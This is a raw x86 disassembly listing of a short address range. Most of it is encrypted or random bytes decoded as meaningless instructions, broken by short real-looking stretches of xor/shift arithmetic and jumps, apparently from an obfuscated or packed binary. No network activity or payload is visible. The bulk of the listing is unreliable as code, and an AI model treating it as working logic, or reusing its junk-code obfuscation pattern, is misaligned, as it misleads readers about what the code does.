  405521:	sbb    ah,0xc6
  405524:	aas    
  405525:	cli    
  405526:	pop    edx
  405527:	and    DWORD PTR [edx-0xf7f71b2],ecx
  40552d:	stos   DWORD PTR es:[edi],eax
  40552e:	mov    al,ds:0x842c0c06
  405533:	(bad)  
  405534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405535:	fidivr DWORD PTR [ecx]
  405537:	sub    al,0x12
  405539:	sub    ecx,DWORD PTR [ecx]
  40553b:	std    
  40553c:	mov    al,ds:0xe644e3f4
  405541:	adc    al,0x41
  405543:	dec    edi
  405544:	and    dh,BYTE PTR [esi]
  405546:	dec    ecx
  405547:	repnz mov esi,0x8c39bfca
  40554d:	in     eax,dx
  40554e:	popa   
  40554f:	cmp    al,ch
  405551:	loop   0x4054fc
  405553:	xchg   esi,eax
  405554:	ja     0x405518
  405556:	or     ah,BYTE PTR [edx-0x13]
  405559:	adc    BYTE PTR [edx+edi*2+0x0],ch
  40555d:	popf   
  40555e:	or     esp,DWORD PTR [edx+0x2d]
  405561:	sbb    eax,esp
  405563:	test   eax,0x48c3997a
  405568:	or     al,0xa8
  40556a:	and    esi,DWORD PTR [ebx+0x629b4b34]
  405570:	add    DWORD PTR [eax-0x4f6dc4bd],eax
  405576:	push   ebp
  405577:	push   ss
  405578:	aam    0x42
  40557a:	into   
  40557b:	bound  ecx,QWORD PTR [esi]
  40557d:	pop    ds
  40557e:	stos   BYTE PTR es:[edi],al
  40557f:	data16 cmp bh,BYTE PTR [eax+0x265e7d96]
  405586:	inc    esp
  405587:	sub    esi,DWORD PTR [edx+0x66]
  40558a:	icebp  
  40558b:	adc    DWORD PTR [edx+0x3],edi
  40558e:	jecxz  0x4055b1
  405590:	popa   
  405591:	dec    ebp
  405592:	inc    ecx
  405593:	xlat   BYTE PTR ds:[ebx]
  405594:	pop    eax
  405595:	xor    esp,edx
  405597:	pop    es
  405598:	fsubr  QWORD PTR [edx+0x4b43acc9]
  40559e:	mov    eax,0x4c9b06bc
  4055a3:	xchg   edi,eax
  4055a4:	add    al,0xf6
  4055a6:	push   edi
  4055a7:	retf   
  4055a8:	cli    
  4055a9:	or     bl,BYTE PTR [esi]
  4055ab:	das    
  4055ac:	xchg   ecx,eax
  4055ad:	popa   
  4055ae:	cs or  ch,cl
  4055b1:	mov    eax,0xd1c540ca
  4055b6:	ins    DWORD PTR es:[edi],dx
  4055b7:	adc    DWORD PTR [esi],esp
  4055b9:	test   BYTE PTR [ebp+edx*4+0x37],dl
  4055bd:	mov    esp,0x83b2961f
  4055c2:	imul   edx,DWORD PTR [eax-0x69],0xffffffc3
  4055c6:	dec    esi
  4055c7:	push   ebp
  4055c8:	jns    0x405637
  4055ca:	call   0x731ce22c
  4055cf:	das    
  4055d0:	jo     0x4055ab
  4055d2:	cmp    al,0xa7
  4055d4:	dec    esi
  4055d5:	or     ah,BYTE PTR ds:0x88854d6e
  4055db:	fnstsw WORD PTR [ebx-0x46]
  4055de:	ret    0x2b6
  4055e1:	stos   BYTE PTR es:[edi],al
  4055e2:	add    eax,esp
  4055e4:	outs   dx,BYTE PTR ds:[esi]
  4055e5:	ins    BYTE PTR es:[edi],dx
  4055e6:	dec    ecx
  4055e7:	mov    ebp,0xf67f7964
  4055ec:	iret   
  4055ed:	sub    bl,ah
  4055ef:	je     0x4055ef
  4055f1:	pop    edi
  4055f2:	sub    DWORD PTR [ebx],esi
  4055f4:	jecxz  0x405675
  4055f6:	dec    edx
  4055f7:	push   ss
  4055f8:	inc    edi
  4055f9:	out    dx,al
  4055fa:	fstp   TBYTE PTR [ebp-0x4132a6d1]
  405600:	jl     0x405666
  405602:	aas    
  405603:	scas   eax,DWORD PTR es:[edi]
  405604:	nop
  405605:	(bad)  
  405606:	loopne 0x40565f
  405608:	sub    DWORD PTR [ecx+0x60],esi
  40560b:	mov    eax,ds:0x51bdef2b
  405610:	sbb    DWORD PTR ss:[ebp-0x41fba953],edx
  405617:	scas   al,BYTE PTR es:[edi]
  405618:	adc    bh,BYTE PTR [edx+0xdbb42be]
  40561e:	mov    al,ds:0x3926ab7d
  405623:	fcmovb st,st(2)
  405625:	or     al,0xb8
  405627:	stos   BYTE PTR es:[edi],al
  405628:	fild   DWORD PTR [ebx]
  40562a:	into   
  40562b:	mov    BYTE PTR [ecx+0x4252117],ah
  405631:	shl    ecx,1
  405633:	jmp    0x30a7:0x890f64bc
  40563a:	jl     0x405657
  40563c:	fistp  QWORD PTR [edi-0x6d]
  40563f:	and    esi,DWORD PTR [ebp+eiz*2-0x44]
  405643:	sti    
  405644:	jno    0x40560e
  405646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405647:	popa   
  405648:	inc    edx
  405649:	lahf   
  40564a:	mov    dh,0xc6
  40564c:	adc    al,0xbb
  40564e:	mov    edi,0xd0b40e76
  405653:	inc    ebx
  405654:	mov    edx,0xa286dab6
  405659:	(bad)  
  40565a:	mov    al,ds:0xbf227088
  40565f:	xchg   edi,eax
  405660:	enter  0x943f,0x71
  405664:	outs   dx,DWORD PTR ds:[esi]
  405665:	xchg   esp,eax
  405666:	aad    0x6f
  405668:	jns    0x40564b
  40566a:	push   es
  40566b:	mov    BYTE PTR [edi+0x707ae600],al
  405671:	pop    ds
  405672:	leave  
  405673:	data16 neg BYTE PTR [edi+0x408af112]
  40567a:	rcr    ah,cl
  40567c:	push   eax
  40567d:	sbb    DWORD PTR [ebp+0x36d3727a],ebx
  405683:	sub    al,0xf2
  405685:	adc    edx,edx
  405687:	dec    esi
  405688:	or     DWORD PTR [ebp-0x4a073dcc],ebp
  40568e:	mov    ecx,0x69cc9aee
  405693:	or     al,0x14
  405695:	xor    ch,BYTE PTR [edx+ebp*8]
  405698:	mov    dl,0x1e
  40569a:	popf   
  40569b:	push   ss
  40569c:	cmp    dh,BYTE PTR [ebx]
  40569e:	imul   eax,eax,0x4a
  4056a1:	mov    esp,0x1fe99a8e
  4056a6:	jae    0x40565d
  4056a8:	xchg   esi,eax
  4056a9:	xchg   esp,eax
  4056aa:	lock and BYTE PTR [edi+ebx*1],dl
  4056ae:	scas   al,BYTE PTR es:[edi]
  4056af:	cli    
  4056b0:	jle    0x4056be
  4056b2:	(bad)  
  4056b3:	push   esp
  4056b4:	cmp    al,0x6b
  4056b6:	arpl   WORD PTR [esi+edi*8-0x58],bx
  4056ba:	cwde   
  4056bb:	shr    BYTE PTR ds:0xccbb7e14,1
  4056c1:	sbb    bh,bh
  4056c3:	cmp    ch,BYTE PTR [ebx+0x3b]
  4056c6:	lods   al,BYTE PTR ds:[esi]
  4056c7:	lahf   
  4056c8:	retf   
  4056c9:	pop    edx
  4056ca:	imul   esp,DWORD PTR [edi+0xff45d13],0xf8f810e1
  4056d4:	mov    ds,WORD PTR [eax]
  4056d6:	push   ebp
  4056d7:	and    ebp,ecx
  4056d9:	daa    
  4056da:	mov    ds:0x2292efc,al
  4056df:	sub    al,dh
  4056e1:	int    0xd3
  4056e3:	adc    BYTE PTR [ebp-0x35],bh
  4056e6:	jge    0x405709
  4056e8:	int    0x7
  4056ea:	push   ss
  4056eb:	sub    eax,0x431be72d
  4056f0:	push   edx
  4056f1:	pop    ebx
  4056f2:	xchg   esi,eax
  4056f3:	(bad)
  4056f6:	addr16 mov ds:0xd3c5,al
  4056fa:	jb     0x4056e7
  4056fc:	test   DWORD PTR [edx+0x6bbe248],0x281ca78d
  405706:	loope  0x405779
  405708:	ret    0xc0a4
  40570b:	mov    eax,0xef50e0b2
  405710:	ins    DWORD PTR es:[edi],dx
  405711:	push   0x555d373c
  405716:	test   al,0xf1
  405718:	xchg   esi,eax
  405719:	call   0x46c38ac7
  40571e:	popf   
  40571f:	mov    ?,WORD PTR [eax+ebx*1-0x6d]
  405723:	push   ecx
  405724:	mov    ds:0x21112f8a,eax
  405729:	pusha  
  40572a:	mov    DWORD PTR [edi-0x31],esi
  40572d:	sub    al,BYTE PTR [ecx-0x38a604fe]
  405733:	add    DWORD PTR [esi-0x2dd93db2],ebp
  405739:	enter  0x24d7,0xf5
  40573d:	mov    al,BYTE PTR [eax]
  40573f:	add    DWORD PTR [ebx-0xc61972a],0xffffffc2
  405746:	xchg   ebx,eax
  405747:	adc    eax,0x5a4751d9
  40574c:	and    bl,BYTE PTR ds:0x43b94152
  405752:	pop    ebx
  405753:	or     ebx,edx
  405755:	out    dx,al
  405756:	mov    esp,0x728cd2c6
  40575b:	push   ds
  40575c:	pop    edi
  40575d:	lahf   
  40575e:	das    
  40575f:	shr    DWORD PTR [edi+0x7b],1
  405762:	xchg   ebx,eax
  405763:	out    dx,eax
  405764:	cmp    bh,BYTE PTR [esi]
  405766:	sbb    al,0xdd
  405768:	test   DWORD PTR gs:[ecx],0x98056a41
  40576f:	push   ecx
  405770:	cmp    DWORD PTR [ebp-0x10ccf087],ebp
  405776:	lods   eax,DWORD PTR ds:[esi]
  405777:	call   FWORD PTR [esi+0x1742c11]
  40577d:	out    0x7b,eax
  40577f:	dec    ebx
  405780:	push   cs
  405781:	add    edx,DWORD PTR [eax-0x3c7c8a1c]
  405787:	out    dx,eax
  405788:	shr    BYTE PTR [esi],1
  40578a:	inc    ebp
  40578b:	cdq    
  40578c:	jo     0x4057cf
  40578e:	xor    eax,0x69f667ef
  405793:	pop    edi
  405794:	(bad)
  405798:	movaps xmm3,XMMWORD PTR [eax-0x458deaea]
  40579f:	inc    ecx
  4057a0:	cmp    DWORD PTR [ebp+0x7bed7507],esp
  4057a6:	add    al,0x27
  4057a8:	aaa    
  4057a9:	push   ebp
  4057aa:	cwde   
  4057ab:	mov    al,0x42
  4057ad:	(bad)
  4057b0:	(bad)  
  4057b3:	push   0x66e1b314
  4057b8:	xchg   esp,eax
  4057b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057ba:	mov    ecx,0xef0a1f24
  4057bf:	mov    ah,0x2a
  4057c1:	adc    eax,0xc324bf20
  4057c6:	inc    edx
  4057c7:	pop    ecx
  4057c8:	js     0x405843
  4057ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057cb:	data16 jae 0x4057a2
  4057ce:	and    ebp,DWORD PTR ds:0x283c8f8e
  4057d4:	addr16 int3 
  4057d6:	jmp    0xb417:0xac3a7fc1
  4057dd:	or     DWORD PTR [eax+0x3238069],eax
  4057e3:	repz xchg edi,eax
  4057e5:	mov    esp,0x5ab206b7
  4057ea:	lahf   
  4057eb:	xlat   BYTE PTR ds:[ebx]
  4057ec:	adc    dh,ch
  4057ee:	xchg   esp,eax
  4057ef:	call   0xa293:0x8a3a80e4
  4057f6:	pop    edi
  4057f7:	jle    0x40583b
  4057f9:	add    DWORD PTR [eax+edx*1+0x55947301],esp
  405800:	fcomi  st,st(1)
  405802:	sub    eax,0x2595a84f
  405807:	push   ebx
  405808:	cwde   
  405809:	in     eax,0x9
  40580b:	push   eax
  40580c:	outs   dx,BYTE PTR ds:[esi]
  40580d:	inc    ebp
  40580e:	lahf   
  40580f:	not    ecx
  405811:	xchg   edi,eax
  405812:	xchg   ecx,eax
  405813:	fiadd  DWORD PTR [esi]
  405815:	shl    bl,0x27
  405818:	pop    edx
  405819:	push   ds
  40581a:	and    al,0x86
  40581c:	rcl    BYTE PTR [ebx],cl
  40581e:	push   ss
  40581f:	mov    ds:0xe658b02,eax
  405824:	jg     0x4057d8
  405826:	out    dx,al
  405827:	fs adc eax,esp
  40582a:	push   0x67
  40582c:	push   0x57bc964a
  405831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405832:	daa    
  405833:	inc    edi
  405834:	push   eax
  405835:	shr    BYTE PTR [bp+si],1
  405838:	xor    al,0xd6
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x4283db
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x4281c7,0x0
  40584d:	mov    DWORD PTR ds:0x4282b7,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x4282b7,0x2ac5
  405875:	cmp    DWORD PTR ds:0x4281c7,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428ec4
  40588d:	adc    DWORD PTR ds:0x42835b,edx
  405893:	or     DWORD PTR ds:0x42828b,0x369f
  40589d:	neg    DWORD PTR ds:0x4281cb
  4058a3:	sub    DWORD PTR ds:0x4281ab,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x40598a
  405910:	adc    ah,BYTE PTR [ebx]
  405912:	stos   BYTE PTR es:[edi],al
  405913:	ins    DWORD PTR es:[edi],dx
  405914:	mov    cl,0x18
  405916:	sbb    BYTE PTR [esi-0x6e7e7ee],bl
  40591c:	test   DWORD PTR [edi+eiz*1+0x8],0xc4fe8b3d
  405924:	fld    TBYTE PTR [edi+edx*8]
  405927:	int3   
  405928:	ret    
  405929:	cmp    dl,BYTE PTR [ebp-0x4e]
  40592c:	push   es
  40592d:	jmp    0x3bcdd411
  405932:	sahf   
  405933:	ret    0xe428
  405936:	mov    cl,0xac
  405938:	je     0x405981
  40593a:	mov    cl,0x78
  40593c:	(bad)  
  40593d:	dec    ebx
  40593e:	or     BYTE PTR [eax-0x6ff29782],cl
  405944:	das    
  405945:	fiadd  WORD PTR [ebp-0x17]
  405948:	iret   
  405949:	cmp    al,0x33
  40594c:	das    
  40594d:	inc    edi
  40594e:	sbb    DWORD PTR [esp+edi*8+0xb7c67c3],ebp
  405955:	out    dx,al
  405956:	mov    ebp,0x61c5f394
  40595b:	and    DWORD PTR [eax+0x61],ecx
  40595e:	mov    esi,0x973ab556
  405963:	(bad)  
  405965:	pop    edi
  405966:	outs   dx,DWORD PTR ds:[esi]
  405967:	rcl    BYTE PTR ds:0x6ff3f309,0x9b
  40596e:	push   edx
  40596f:	ins    DWORD PTR es:[edi],dx
  405970:	daa    
  405971:	loop   0x4059ed
  405973:	daa    
  405974:	in     al,0x69
  405976:	push   0xc89c9526
  40597b:	pop    ds
  40597c:	inc    esp
  40597d:	or     ah,BYTE PTR [ecx-0x1b]
  405980:	jnp    0x4059c9
  405982:	retf   0xd310
  405985:	sub    cl,BYTE PTR [ebx]
  405987:	ins    DWORD PTR es:[edi],dx
  405988:	cmp    dl,0x8c
  40598b:	push   ebp
  40598c:	xor    eax,0x8003da47
  405991:	cdq    
  405992:	dec    edx
  405993:	adc    cl,ch
  405995:	jne    0x405990
  405997:	jmp    0x405a15
  405999:	aaa    
  40599a:	out    dx,eax
  40599b:	push   edi
  40599c:	xchg   edi,eax
  40599d:	sbb    cl,BYTE PTR [eax]
  40599f:	int3   
  4059a0:	ret    0x6f1d
  4059a3:	sti    
  4059a4:	or     DWORD PTR [ebx+0x5f],ebx
  4059a7:	lock or DWORD PTR [ebp-0x26],ecx
  4059ab:	jmp    0x9d80d1a
  4059b0:	adc    DWORD PTR [edi],ecx
  4059b2:	xchg   esi,eax
  4059b3:	enter  0x92f1,0x36
  4059b7:	outs   dx,BYTE PTR ds:[esi]
  4059b8:	and    al,0xa1
  4059ba:	sub    DWORD PTR [esi+eiz*2-0x60a06993],esp
  4059c1:	test   al,0xe9
  4059c3:	jbe    0x405996
  4059c5:	mov    edi,0x1cea0af8
  4059ca:	xor    ch,al
  4059cc:	hlt    
  4059cd:	popf   
  4059ce:	xchg   ebp,eax
  4059cf:	jae    0x4059a9
  4059d1:	xor    al,0xc3
  4059d3:	jle    0x405a3c
  4059d5:	mov    al,0x4f
  4059d7:	mov    BYTE PTR [edi-0x4a7bf3b2],bl
  4059dd:	inc    edx
  4059de:	xchg   ecx,edx
  4059e0:	fcmovu st,st(5)
  4059e2:	and    al,al
  4059e4:	retf   
  4059e5:	out    dx,al
  4059e6:	test   cl,ch
  4059e8:	add    eax,0xf8928408
  4059ed:	icebp  
  4059ee:	div    bh
  4059f0:	and    DWORD PTR [eax+0x2d],0xffffffce
  4059f4:	inc    ecx
  4059f5:	shl    DWORD PTR [ebp-0x3a332a9c],1
  4059fb:	fnstenv [esi+ecx*4+0x6a2bfdd4]
  405a02:	in     eax,dx
  405a03:	std    
  405a04:	inc    esp
  405a05:	stos   BYTE PTR es:[edi],al
  405a06:	mov    WORD PTR [ecx+0x514eb3e0],es
  405a0c:	pop    es
  405a0d:	leave  
  405a0e:	or     eax,0x79ec79a6
  405a13:	shufps xmm5,XMMWORD PTR [esi],0x6d
  405a17:	leave  
  405a18:	xor    BYTE PTR [esi],0x87
  405a1b:	jle    0x405a42
  405a1d:	das    
  405a1e:	fld    QWORD PTR [eax+0x5354b429]
  405a24:	std    
  405a25:	mov    ds:0x59ba8853,eax
  405a2a:	mov    ds:0x2e61bfed,eax
  405a2f:	mov    dl,0xf1
  405a31:	xchg   edx,eax
  405a32:	xchg   dh,cl
  405a34:	xor    eax,0x3076fbbe
  405a39:	sub    al,0xb7
  405a3b:	xchg   ebx,eax
  405a3d:	push   ds
  405a3e:	mov    al,ds:0xee674e0e
  405a43:	shl    DWORD PTR [edi+0x7b],0x9a
  405a47:	leave  
  405a48:	cwde   
  405a49:	rol    DWORD PTR [edx-0x42a4c7a],0xf3
  405a50:	jp     0x405a5f
  405a52:	inc    edx
  405a53:	jp     0x4059e1
  405a55:	jle    0x4059f6
  405a57:	jb     0x405a77
  405a59:	add    esi,esp
  405a5b:	test   DWORD PTR [ecx+0x41b15d6f],ebp
  405a61:	mov    edx,0x75781cd0
  405a66:	and    edi,ebp
  405a68:	jecxz  0x405a10
  405a6a:	push   eax
  405a6b:	sbb    BYTE PTR [edx-0x4b],bl
  405a6e:	loopne 0x405a40
  405a70:	and    DWORD PTR [ecx-0xb21feba],esp
  405a76:	imul   edi,DWORD PTR [esi-0xfb3cfa6],0xe97831bd
  405a80:	or     eax,0x6424359f
  405a85:	jne    0x405a49
  405a87:	cmp    eax,edi
  405a89:	mov    ecx,0x9ec51946
  405a8e:	pop    esp
  405a8f:	and    ecx,DWORD PTR [edx+0x734aed02]
  405a95:	ss stos DWORD PTR es:[edi],eax
  405a97:	adc    eax,0xed39ab6
  405a9c:	add    DWORD PTR [ebp+esi*2+0x24],ebx
  405aa0:	mov    bh,BYTE PTR [esi]
  405aa2:	jl     0x405af2
  405aa4:	pusha  
  405aa5:	sub    al,0x5e
  405aa7:	mov    cl,0xf3
  405aa9:	mov    eax,ds:0x7fe19a0f
  405aae:	mov    ecx,edi
  405ab0:	mov    ah,0xc8
  405ab2:	xchg   ebx,eax
  405ab3:	fcom   QWORD PTR [edx]
  405ab5:	iret   
  405ab6:	add    ecx,DWORD PTR [eax]
  405ab8:	fldenv [esi]
  405aba:	xor    eax,0xd24ea56f
  405abf:	mov    ds:0x32c8e610,eax
  405ac4:	retf   
  405ac5:	lea    eax,[esi+ecx*2-0x11]
  405ac9:	cdq    
  405aca:	add    eax,0x454582b2
  405acf:	mov    ah,0xb7
  405ad1:	gs dec ebx
  405ad3:	xchg   esp,eax
  405ad4:	adc    DWORD PTR [ebp+0x6cc3375f],ebx
  405ada:	cmp    BYTE PTR ds:0xb15e5753,dh
  405ae0:	in     eax,0x68
  405ae2:	mov    edi,ecx
  405ae4:	ret    0xff20
  405ae7:	int    0x5
  405ae9:	ja     0x405a95
  405aeb:	scas   eax,DWORD PTR es:[edi]
  405aec:	(bad)  
  405aed:	mov    WORD PTR [ebp-0x39eb878a],fs
  405af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405af4:	(bad)
  405af8:	dec    eax
  405af9:	sti    
  405afa:	ins    DWORD PTR es:[edi],dx
  405afb:	retf   
  405afc:	cmp    cl,BYTE PTR [edx-0x5f]
  405aff:	mov    ds:0xd8ac01ce,eax
  405b04:	test   eax,0xc5704cf7
  405b09:	or     al,0x9c
  405b0b:	and    al,0x2f
  405b0d:	or     BYTE PTR [ebx],ah
  405b0f:	dec    edi
  405b10:	sbb    eax,0x14b5d598
  405b15:	mov    eax,ds:0xdb3442d0
  405b1a:	xchg   BYTE PTR [edx],bl
  405b1c:	(bad)  
  405b1d:	arpl   bp,si
  405b1f:	xchg   edx,eax
  405b20:	arpl   WORD PTR [eax-0x719f906e],di
  405b26:	lods   al,BYTE PTR ds:[esi]
  405b27:	push   ecx
  405b28:	imul   esp,edx,0xc0152b9d
  405b2e:	jl     0x405b82
  405b30:	scas   al,BYTE PTR es:[edi]
  405b31:	popa   
  405b32:	jecxz  0x405b17
  405b34:	retf   0x8a6
  405b37:	mov    eax,0x2f0c9e51
  405b3c:	pushf  
  405b3d:	addr16 clc 
  405b3f:	stc    
  405b40:	sub    al,0x7f
  405b42:	ins    DWORD PTR es:[edi],dx
  405b43:	add    edx,DWORD PTR [ebp+0x64]
  405b46:	cli    
  405b47:	cmp    dl,cl
  405b49:	sbb    eax,0x3dc4deb8
  405b4e:	inc    DWORD PTR [esi]
  405b50:	dec    edx
  405b51:	xchg   esi,eax
  405b52:	inc    ecx
  405b53:	retf   0xd74f
  405b56:	push   esi
  405b57:	push   ss
  405b58:	mov    ebp,0x2cb91061
  405b5d:	std    
  405b5e:	xchg   di,ax
  405b60:	das    
  405b61:	inc    ebx
  405b62:	adc    DWORD PTR [ebx-0x7d4ad20],0xb5c612a
  405b6c:	mov    ecx,0xed768e2b
  405b71:	sahf   
  405b72:	adc    ch,BYTE PTR [ebx+0x4c82879a]
  405b78:	(bad)  
  405b79:	test   BYTE PTR [edi],al
  405b7b:	push   ecx
  405b7c:	xor    eax,0xc5f94278
  405b81:	inc    ebx
  405b82:	call   0x8994:0x43b095f1
  405b89:	aad    0x17
  405b8b:	push   0x90c97b25
  405b90:	or     BYTE PTR [edi+0x4],cl
  405b93:	jmp    0x94951779
  405b98:	cmp    cl,al
  405b9a:	xchg   esp,eax
  405b9b:	cmc    
  405b9c:	inc    ecx
  405b9d:	fisttp WORD PTR [ebx+eiz*8]
  405ba0:	inc    edi
  405ba1:	push   ss
  405ba2:	xor    bh,ch
  405ba4:	in     al,dx
  405ba5:	test   BYTE PTR [ebp-0x75],dh
  405ba8:	dec    ebx
  405ba9:	jne    0x405be4
  405bab:	pop    esi
  405bac:	mov    bl,0x35
  405bae:	push   esi
  405baf:	push   esi
  405bb0:	push   ebp
  405bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bb2:	mul    BYTE PTR es:[esi-0x12]
  405bb6:	or     BYTE PTR [ecx-0x32531073],0x23
  405bbd:	inc    esi
  405bbe:	mov    ah,0x8f
  405bc0:	js     0x405b79
  405bc2:	das    
  405bc3:	inc    ebx
  405bc4:	dec    edi
  405bc5:	add    al,0xa6
  405bc7:	push   esp
  405bc8:	call   FWORD PTR [eax-0x1e4986ed]
  405bce:	dec    ecx
  405bcf:	int    0xc9
  405bd1:	xchg   BYTE PTR [esi+0x54],al
  405bd4:	mov    bh,0xe9
  405bd6:	retf   
  405bd7:	fist   WORD PTR [edi]
  405bd9:	ret    
  405bda:	push   ebp
  405bdb:	dec    ebp
  405bdc:	in     eax,0x19
  405bde:	mov    cl,BYTE PTR [ecx-0x2a309f97]
  405be4:	test   BYTE PTR [esi-0x499ea622],bl
  405bea:	out    dx,eax
  405beb:	or     dl,BYTE PTR [edi]
  405bed:	mov    dl,0xe0
  405bef:	arpl   WORD PTR [edx],bx
  405bf1:	jb     0x405ba1
  405bf3:	outs   dx,DWORD PTR ds:[esi]
  405bf4:	and    DWORD PTR [esi],0x48
  405bf7:	jae    0x405bfd
  405bf9:	loope  0x405c50
  405bfb:	ja     0x405bae
  405bfd:	or     eax,0xbd69c22
  405c02:	xor    DWORD PTR [eax+0x59791fc9],0x1e9e90dd
  405c0c:	retf   0x2d49
  405c0f:	push   edx
  405c10:	inc    ebx
  405c11:	and    DWORD PTR [ebx-0x7779dca9],0xffffffd8
  405c18:	xlat   BYTE PTR ds:[ebx]
  405c19:	xchg   BYTE PTR [ebp-0x21bf89f0],cl
  405c1f:	test   eax,0x8906b1ce
  405c24:	dec    ebx
  405c25:	stc    
  405c26:	lea    eax,fs:[edi+0x52fe779e]
  405c2d:	inc    esi
  405c2e:	mov    al,BYTE PTR [edi+0x240de31a]
  405c34:	jb     0x405c2f
  405c36:	or     dl,BYTE PTR [edi-0x3f]
  405c39:	bound  ebx,QWORD PTR [esi-0x7a]
  405c3c:	js     0x405bfb
  405c3e:	rcr    DWORD PTR [ebx+0x2],1
  405c41:	adc    DWORD PTR [ebx],edi
  405c43:	and    DWORD PTR [ebx-0x4b12b81f],ebx
  405c49:	xor    bl,BYTE PTR [ebx+0x74]
  405c4c:	or     DWORD PTR [ebx+0x42f8f6fc],ebx
  405c52:	sti    
  405c53:	popa   
  405c54:	mov    al,ds:0x152371bb
  405c59:	mov    al,0x9c
  405c5b:	retf   
  405c5c:	rcr    BYTE PTR [eax],1
  405c5e:	inc    edx
  405c5f:	addr16 jae 0x405c32
  405c62:	mov    ah,0x79
  405c64:	stos   BYTE PTR es:[edi],al
  405c65:	gs das 
  405c67:	sbb    al,0xfd
  405c69:	sub    BYTE PTR [ebx],ah
  405c6b:	stos   BYTE PTR es:[edi],al
  405c6c:	adc    eax,DWORD PTR [ecx+0x4d7a4467]
  405c72:	pop    ecx
  405c73:	sub    ecx,ebx
  405c75:	leave  
  405c76:	sbb    BYTE PTR [ebx-0x1c],ch
  405c79:	ins    BYTE PTR es:[edi],dx
  405c7a:	cwde   
  405c7b:	gs push 0x7d65f642
  405c81:	and    al,ch
  405c83:	jno    0x405cdd
  405c85:	push   ecx
  405c86:	dec    ebp
  405c87:	lds    esi,FWORD PTR [ecx+0x63]
  405c8a:	xchg   DWORD PTR [esi-0x3d],esi
  405c8d:	sub    esi,DWORD PTR [edi+0x67]
  405c90:	push   es
  405c91:	(bad)  
  405c92:	sub    al,0x89
  405c94:	mov    esp,0xa5367d26
  405c99:	ret    
  405c9a:	shl    BYTE PTR [ebx-0x35b9a0f2],cl
  405ca0:	outs   dx,BYTE PTR ds:[esi]
  405ca1:	push   edi
  405ca2:	sub    bl,BYTE PTR [eax]
  405ca4:	push   esi
  405ca5:	xor    dh,BYTE PTR [ebp+0x8]
  405ca8:	mov    ecx,0x5cd47985
  405cad:	je     0x405d23
  405caf:	lods   al,BYTE PTR ds:[esi]
  405cb0:	mov    ah,0xdf
  405cb2:	jmp    0x11bc:0xf6302998
  405cb9:	ja     0x405c98
  405cbb:	cmp    al,0xd
  405cbd:	dec    esi
  405cbe:	xchg   ebp,eax
  405cbf:	jp     0x405c85
  405cc1:	fld    DWORD PTR [ecx]
  405cc3:	mov    eax,0x7d3ec375
  405cc8:	add    bh,BYTE PTR ds:[edx-0x7f0ecd08]
  405ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cd0:	jle    0x405d14
  405cd2:	push   0xab8f263f
  405cd7:	rcr    DWORD PTR [ebx],1
  405cd9:	out    0x9,al
  405cdb:	sbb    BYTE PTR [ecx+0x45c7d445],cl
  405ce1:	loopne 0x405d54
  405ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce4:	jns    0x405cb0
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax+0x14],1
  405d2b:	daa    
  405d2c:	hlt    
  405d2d:	push   0xfffffff2
